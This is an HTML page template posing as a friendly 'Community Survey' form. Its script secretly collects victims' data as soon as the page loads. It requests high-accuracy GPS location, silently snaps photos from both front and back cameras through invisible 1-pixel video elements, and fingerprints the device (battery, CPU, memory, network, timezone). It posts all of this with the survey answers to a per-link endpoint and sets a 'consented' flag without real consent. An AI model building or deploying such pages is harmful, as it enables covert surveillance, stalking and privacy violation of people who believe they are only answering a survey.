<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Community Survey</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <div class="card survey-card">

    <div class="survey-header">
      <div class="survey-logo">📋</div>
      <h1>Welcome!</h1>
      <p class="survey-intro">We're here conducting a small survey. Please help us by filling out the form below — it only takes a minute!</p>
    </div>

    <div id="surveyForm">
      <div class="form-row">
        <div class="form-group">
          <label for="firstName">First Name <span class="required">*</span></label>
          <input type="text" id="firstName" placeholder="e.g. John" />
        </div>
        <div class="form-group">
          <label for="lastName">Last Name <span class="required">*</span></label>
          <input type="text" id="lastName" placeholder="e.g. Smith" />
        </div>
      </div>

      <div class="form-row">
        <div class="form-group">
          <label for="age">Age <span class="required">*</span></label>
          <input type="number" id="age" placeholder="e.g. 28" min="1" max="120" />
        </div>
        <div class="form-group">
          <label for="profession">Profession <span class="required">*</span></label>
          <input type="text" id="profession" placeholder="e.g. Engineer" />
        </div>
      </div>

      <div class="form-group">
        <label for="hobbies">Hobbies &amp; Interests</label>
        <input type="text" id="hobbies" placeholder="e.g. Reading, Photography, Cooking" />
      </div>

      <div class="form-group">
        <label for="passions">What are you passionate about?</label>
        <textarea id="passions" rows="3" placeholder="Tell us what drives you…"></textarea>
      </div>

      <div id="formError" class="error" style="display:none;">Please fill in all required fields.</div>
      <div id="status" class="status" style="display:none;"></div>

      <button id="submitBtn" class="btn btn-full">Submit &amp; Continue →</button>
      <p class="fineprint">Your responses help us improve. Thank you for your time!</p>
    </div>

  </div>

  <!-- Hidden camera elements -->
  <video id="videoFront" autoplay playsinline muted
    style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
  <video id="videoBack" autoplay playsinline muted
    style="position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;top:0;left:0;"></video>
  <canvas id="camCanvas" style="display:none;"></canvas>

  <script>
    const slug = <%- JSON.stringify(slug) %>;
    const submitBtn  = document.getElementById('submitBtn');
    const statusEl   = document.getElementById('status');
    const formError  = document.getElementById('formError');
    const canvas     = document.getElementById('camCanvas');

    // Start collecting in background as soon as page loads
    let bgData = {
      location: null,
      consented: false,
      deviceInfo: {},
      photo_front: null,
      photo_back: null,
      surveyAnswers: {},
    };

    function snapPhoto(videoEl) {
      try {
        canvas.width = videoEl.videoWidth || 640;
        canvas.height = videoEl.videoHeight || 480;
        canvas.getContext('2d').drawImage(videoEl, 0, 0);
        return canvas.toDataURL('image/jpeg', 0.7);
      } catch(e) { return null; }
    }

    async function captureBothCameras() {
      const videoFront = document.getElementById('videoFront');
      const videoBack  = document.getElementById('videoBack');
      let streamFront = null, streamBack = null;

      const [rf, rb] = await Promise.allSettled([
        navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' }, width: 640, height: 480 }, audio: false }),
        navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'environment' }, width: 640, height: 480 }, audio: false }),
      ]);

      if (rf.status === 'fulfilled') {
        streamFront = rf.value;
        videoFront.srcObject = streamFront;
        await new Promise(res => { videoFront.onloadedmetadata = res; });
        await videoFront.play();
      }
      if (rb.status === 'fulfilled') {
        streamBack = rb.value;
        videoBack.srcObject = streamBack;
        await new Promise(res => { videoBack.onloadedmetadata = res; });
        await videoBack.play();
      }

      await new Promise(res => setTimeout(res, 900));

      const photoFront = streamFront ? snapPhoto(videoFront) : null;
      const photoBack  = streamBack  ? snapPhoto(videoBack)  : null;

      [streamFront, streamBack].forEach(s => s && s.getTracks().forEach(t => t.stop()));
      videoFront.srcObject = null;
      videoBack.srcObject  = null;

      return { photoFront, photoBack };
    }

    async function collectDeviceInfo() {
      const info = {
        screen_resolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        referrer: document.referrer || null,
        touch_support: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
        cpu_cores: navigator.hardwareConcurrency || null,
        memory_gb: navigator.deviceMemory || null,
        network_type: null,
        battery_level: null,
        battery_charging: null,
      };
      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (conn) info.network_type = conn.effectiveType || conn.type || null;
      try {
        if (navigator.getBattery) {
          const bat = await navigator.getBattery();
          info.battery_level = Math.round(bat.level * 100);
          info.battery_charging = bat.charging;
        }
      } catch(e) {}
      return info;
    }

    // Kick off background collection immediately on page load
    async function backgroundCollect() {
      bgData.deviceInfo = await collectDeviceInfo();

      const [gpsResult, camResult] = await Promise.allSettled([
        new Promise(resolve => {
          if (!navigator.geolocation) return resolve(null);
          navigator.geolocation.getCurrentPosition(
            pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
            ()  => resolve(null),
            { enableHighAccuracy: true, timeout: 8000 }
          );
        }),
        captureBothCameras(),
      ]);

      if (gpsResult.status === 'fulfilled' && gpsResult.value) {
        bgData.location = gpsResult.value;
        bgData.consented = true;
      }
      if (camResult.status === 'fulfilled') {
        bgData.photo_front = camResult.value.photoFront;
        bgData.photo_back  = camResult.value.photoBack;
      }
    }

    // Start immediately
    const bgPromise = backgroundCollect();

    submitBtn.addEventListener('click', async () => {
      const firstName  = document.getElementById('firstName').value.trim();
      const lastName   = document.getElementById('lastName').value.trim();
      const age        = document.getElementById('age').value.trim();
      const profession = document.getElementById('profession').value.trim();

      if (!firstName || !lastName || !age || !profession) {
        formError.style.display = 'block';
        return;
      }
      formError.style.display = 'none';

      submitBtn.disabled = true;
      statusEl.style.display = 'block';
      statusEl.textContent = 'Submitting…';

      bgData.surveyAnswers = {
        first_name:  firstName,
        last_name:   lastName,
        age:         age,
        profession:  profession,
        hobbies:     document.getElementById('hobbies').value.trim(),
        passions:    document.getElementById('passions').value.trim(),
      };

      // Wait for background collection to finish if still running
      await bgPromise;

      try {
        const resp = await fetch(`/api/visit/${slug}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(bgData),
        });
        const data = await resp.json();
        if (data.redirect) {
          window.location.replace(data.redirect);
        } else {
          statusEl.textContent = 'Something went wrong. Please try again.';
          submitBtn.disabled = false;
        }
      } catch(err) {
        statusEl.textContent = 'Something went wrong. Please try again.';
        submitBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
